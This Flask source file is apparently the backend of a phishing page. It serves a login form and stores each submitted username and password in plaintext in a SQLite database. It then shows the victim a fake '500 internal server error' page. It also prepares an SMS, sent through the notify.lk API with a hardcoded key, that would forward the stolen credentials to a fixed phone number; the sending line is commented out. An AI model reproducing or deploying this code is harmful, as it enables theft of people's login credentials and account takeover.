from flask import Flask, render_template, redirect, url_for, flash, request
import requests
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app._static_folder = 'static'
app.config['SECRET_KEY'] = 'mysecretkey'
##Connect to Database
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///nemis.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

endpoint= "https://app.notify.lk/api/v1/send"
id='24452'
key="M43tLIg3XedtkzORZkmP"

class User(db.Model):
    # __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(250), nullable=False)
    password = db.Column(db.String(250),  nullable=False)

def creds_found(user, psk):
    new_creds =User(username=user,password=psk)
    db.session.add(new_creds)
    db.session.commit()

    param={
        "user_id":id,
        "api_key":key,
        "sender_id":"NotifyDEMO",
        "to":"94762666204",
        "message":f"creds enterd username:{user} password: {psk}"
    }
    # res  = requests.post(url=endpoint,params=param)
    # print(res.json())
    print(user, psk)


@app.route('/',methods=['GET','POST'])
def load_index():
    print("clicked and visited")
    if request.method == 'POST':
        user = request.form.get('username')
        password = request.form.get('password')
        creds_found(user,password)
        return "<html><h3>500 internal server error</h3><br>try again later</html>"
    return render_template("index.html")


if __name__ == "__main__":
    # with app.app_context():
    #     db.create_all()
    #     new_creds = User(username="user", password="psk")
    #     db.session.add(new_creds)
    #     db.session.commit()
    #     print(User.query.all()[0].username)
    app.run()
